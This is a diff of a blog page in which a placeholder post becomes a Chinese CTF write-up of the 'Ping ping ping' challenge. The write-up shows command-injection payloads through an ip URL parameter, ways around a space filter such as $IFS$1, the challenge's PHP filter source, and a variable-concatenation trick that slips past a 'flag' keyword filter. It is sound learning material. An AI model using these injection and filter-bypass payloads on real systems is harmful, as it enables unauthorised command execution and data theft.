@@ -3,7 +3,7 @@
 <html lang="en">
 <head>
     <meta charset="utf-8" />
-    <title>test | 66+144</title>
+    <title>Ping ping ping | 66+144</title>
     <meta name="author" content="LUEFLAM" />
     <meta name="description" content="" />
     <meta name="keywords" content="" />
@@ -150,7 +150,7 @@
         <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
             <div class="article">
     <div>
-        <h1>test</h1>
+        <h1>Ping ping ping</h1>
     </div>
     <div class="info">
         <span class="date">
@@ -169,7 +169,7 @@
             
             <span class="tag">
                 
-                <a href="/MIA/tags/CTF/" style="color: #00a596">CTF</a>
+                <a href="/MIA/tags/CTF/" style="color: #ff7d73">CTF</a>
             </span>
             
         </span>
@@ -177,7 +177,80 @@
     </div>
     
     <div class="content" v-pre>
-        <p>hell</p>
+        <p>依旧是随便点开的一个题目，但很有趣。<br>主要是想用用firefox渗透版，不太想每次打开burp suite。</p>
+<h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><h3 id="（1）"><a href="#（1）" class="headerlink" title="（1）"></a>（1）</h3><p>打开靶场，扑面而来一个<br><code>/?ip=</code><br>（如果有点觉悟就会想起来之前做的文件上传从而意识到这是个URL地址符提示。不过当时没有，甚至在想这是什么代码……php？html？）<br>于是熟练的打开edge查询wp。<br>于是</p>
+<pre><code class="URL">http://2993ad62-21c8-4f1d-b4d6-05bdd7130b70.node4.buuoj.cn:81/?ip=127.0.0.1;ls
+</code></pre>
+<p>喜提<br>(补充：尝试了一下<code>&amp;&amp; ls</code>，什么有用的也没有得到)</p>
+<pre><code class="txt">PING 127.0.0.1 (127.0.0.1): 56 data bytes
+flag.php
+index.php
+</code></pre>
+<p>这告诉我们有两个php文件，名字如上。</p>
+<h3 id="（2）"><a href="#（2）" class="headerlink" title="（2）"></a>（2）</h3><p>再用<code>cat</code>命令</p>
+<pre><code class="url">/?ip=xxx;cat flag.php
+</code></pre>
+<p>喜提<code>fuck your space</code>。<br>好嘛，用能想到的space替换符，%20之类的，毫不意外不行。<br>wp提供了更多的绕过space：</p>
+<pre><code class="txt">$&#123;IFS&#125;
+$IFS$1
+$&#123;IFS
+&lt;&gt; or &lt; 重定向符替换
+%09
+</code></pre>
+<p>原博一个个试后告诉大家，<code>$IFS$1</code>行得通。</p>
+<pre><code class="URL">https://xxx/?ip=127.0.0.1;cat$IFS$1flag.php
+</code></pre>
+<p>又告诉你不行——因为flag被过滤了。</p>
+<h3 id="（3）"><a href="#（3）" class="headerlink" title="（3）"></a>（3）</h3><p>试一下index.php，</p>
+<pre><code class="php">PING 127.0.0.1 (127.0.0.1): 56 data bytes
+/?ip=
+|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;
+    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);
+    die(&quot;fxck your symbol!&quot;);
+  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;
+    die(&quot;fxck your space!&quot;);
+  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;
+    die(&quot;fxck your bash!&quot;);
+  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;
+    die(&quot;fxck your flag!&quot;);
+  &#125;
+  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);
+  echo &quot;
+&quot;;
+  print_r($a);
+&#125;
+?&gt;
+</code></pre>
+<p>解释一下就是：</p>
+<ul>
+<li><ol>
+<li><code>PING 127.0.0.1 (127.0.0.1): 56 data bytes</code>：这是一个命令行输出，表示将对IP地址 127.0.0.1 进行Ping测试。<code>/?ip=</code>：这是一个URL参数，用于接收要测试的目标IP地址。</li>
+</ol>
+</li>
+<li><ol start="2">
+<li><code>|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))</code>：这是一个正则表达式，用于检查输入的IP地址是否包含特定的符号（ <code>&#39;</code>, <code>&quot;</code>, <code>\</code>, <code>(</code>, <code>)</code>, <code>[</code>, <code>]</code>, <code>&#123;</code>, <code>&#125;</code>）。然后 <code>echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</code>：这一行判断输入的IP地址是否包含特殊字符，并输出匹配结果。最后<code>die(&quot;fxck your symbol!&quot;);</code>：如果前面的正则表达式匹配到特殊字符，将输出错误信息并终止程序运行。</li>
+</ol>
+</li>
+<li><ol start="3">
+<li><code>preg_match(&quot;/ /&quot;, $ip)</code>：这是一个正则表达式，用于检查输入的IP地址是否包含空格。然后<code>die(&quot;fxck your space!&quot;);</code>：如果输入的IP地址包含空格，将输出错误信息并终止程序运行。后面都一样就不重复了。</li>
+</ol>
+</li>
+<li><ol start="4">
+<li><code>$a = shell_exec(&quot;ping -c 4 &quot;.$ip);</code>：执行Ping命令，通过shell_exec函数在操作系统中运行命令，并将结果存储在变量$a中。</li>
+</ol>
+</li>
+<li><p>5.<code>print_r($a);</code>：打印Ping命令的结果，显示Ping测试的输出信息。</p>
+</li>
+</ul>
+<h3 id="（4）"><a href="#（4）" class="headerlink" title="（4）"></a>（4）</h3><p>看完这么多过滤，基本可以确定没什么常规的可以写了。<br>于是一个有趣的就来了：<br><strong>改变变量值</strong></p>
+<p>有一个变量<code>$a</code>，原本的值是第4条说的，我们进行人为修改（它也没禁止）：</p>
+<pre><code class="url">https://xxx/?ip=xxxx;a=g;cat$IFS$1fla$a.php
+</code></pre>
+<p>解释一下就是：</p>
+<pre><code class="python">a=g
+flag=fla$a
+</code></pre>
+<p>不懂的永别了.jpg<br>然后就变成了初始界面。很懵逼是吧。<br>查看页面源代码获得惊喜。至于为什么会这样待我研究一下再来写。</p>
 
     </div>
     
